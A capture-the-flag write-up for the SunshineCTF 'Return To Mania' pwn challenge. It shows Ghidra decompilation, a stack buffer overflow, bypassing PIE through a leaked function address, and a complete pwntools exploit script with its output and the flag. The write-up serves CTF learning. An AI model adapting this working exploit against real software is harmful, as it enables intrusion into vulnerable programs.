# Return To Mania
PWN, 50 points

## Description

> To celebrate her new return to wrestling, Captn Overflow authored this challenge to enter the ring

A binary file was attached.

## Solution

Let's run the file:

```console
root@kali:/media/sf_CTFs/sunshine/Return_To_Mania# ./return-to-mania
Welcome to WrestleMania! Type in key to get access.
addr of welcome(): 0x565c16ed
test
Sadly, as a result Captn Overflow won't be entering the ring yet...
```

We are presented with an address, and an opportunity to enter a string. 

Let's view the decompilation with Ghidra:

```c
void welcome(void)
{
  undefined local_16 [14];
  
  puts("Welcome to WrestleMania! Type in key to get access.");
  printf("addr of welcome(): %p\n",welcome);
  __isoc99_scanf(&DAT_0001087b,local_16);
  return;
}

undefined4 main(undefined1 param_1)
{
  welcome();
  puts("Sadly, as a result Captn Overflow won\'t be entering the ring yet...");
  return 0;
}
```

So this is a trivial buffer overflow of `local_16`, hijacking the return address. 

Where would we like to jump to? From a short exploration of the remaining code, probably here:

```c
void mania(void)

{
  char local_38 [40];
  FILE *local_10;
  
  puts("WELCOME TO THE RING!");
  local_10 = fopen("flag.txt","r");
  if (local_10 == (FILE *)0x0) {
    perror("flag.txt");
  }
  else {
    fgets(local_38,0x28,local_10);
    fclose(local_10);
    puts(local_38);
  }
  return;
}
```

One last thing to check before we start writing the exploit: What are the executable security attributes?

```console
root@kali:/media/sf_CTFs/sunshine/Return_To_Mania# checksec.sh -f return-to-mania
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      Symbols         FORTIFY Fortified       Fortifiable  FILE
No RELRO        No canary found   NX enabled    PIE enabled     No RPATH   No RUNPATH   75 Symbols      No      0               4       return-to-mania
```

We don't have a stack canary but we do have to bypass PIE/ASLR. Luckily, `welcome()`'s address is "leaked" to us, so we can use that to calculate the ASLR base.

The script:
```python
#!/usr/bin/env python2
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template --host archive.sunshinectf.org --port 19001 ./return-to-mania
from pwn import *
import os

# Set up pwntools for the correct architecture
exe = context.binary = ELF('./return-to-mania')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
host = args.HOST or 'archive.sunshinectf.org'
port = int(args.PORT or 19001)

def local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return local(argv, *a, **kw)
    else:
        return remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
break *0x{exe.symbols.main:x}
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     i386-32-little
# RELRO:    No RELRO
# Stack:    No canary found
# NX:       NX enabled
# PIE:      PIE enabled


def get_overflow_offset():
    # It's problematic to create a core dump on an NTFS file system,
    # so reconfigure core dumps to be created elsewhere
    os.system("echo ~/core/core_dump > /proc/sys/kernel/core_pattern")
    os.system("rm ./core.*")

    payload = cyclic(100)
    proc = local()

    proc.recvline()
    proc.recvline()
    proc.sendline(payload)

    proc.wait()
    offset = cyclic_find(proc.corefile.eip)
    return offset

overflow_offset = get_overflow_offset()
log.info("Overflow offset: {}".format(overflow_offset))

io = start()
io.recvline()
io.recvuntil("addr of welcome():")

welcome_addr = int(io.recvline(keepends = False), 16)
log.info("welcome() address: {}".format(hex(welcome_addr)))

aslr_base = welcome_addr - exe.symbols["welcome"]

#mania_addr = ((welcome_addr & 0xFFFFF000) + exe.symbols["mania"])
mania_addr = aslr_base + exe.symbols["mania"]
log.info("mania() address: {}".format(hex(mania_addr)))

payload = fit({overflow_offset: p32(mania_addr)}, filler = "A")
log.info("Sending payload: {}".format(enhex(payload)))

io.sendline(payload)
print io.recvall()
```

The output:
```console
root@kali:/media/sf_CTFs/sunshine/Return_To_Mania# python exploit.py REMOTE
[*] '/media/sf_CTFs/sunshine/Return_To_Mania/return-to-mania'
    Arch:     i386-32-little
    RELRO:    No RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      PIE enabled
[+] Starting local process '/media/sf_CTFs/sunshine/Return_To_Mania/return-to-mania': pid 25943
[*] Process '/media/sf_CTFs/sunshine/Return_To_Mania/return-to-mania' stopped with exit code -11 (SIGSEGV) (pid 25943)
[+] Parsing corefile...: Done
[*] '/media/sf_CTFs/sunshine/Return_To_Mania/core.25943'
    Arch:      i386-32-little
    EIP:       0x61676161
    ESP:       0xffa81c60
    Exe:       '/media/sf_CTFs/sunshine/Return_To_Mania/return-to-mania' (0x5664d000)
    Fault:     0x61676161
[*] Overflow offset: 22
[+] Opening connection to archive.sunshinectf.org on port 19001: Done
[*] welcome() address: 0x565fa6ed
[*] mania() address: 0x565fa65d
[*] Sending payload: 414141414141414141414141414141414141414141415da65f56
[+] Receiving all data: Done (53B)
[*] Closed connection to archive.sunshinectf.org port 19001
WELCOME TO THE RING!
sun{0V3rfl0w_rUn_w!Ld_br0th3r}
```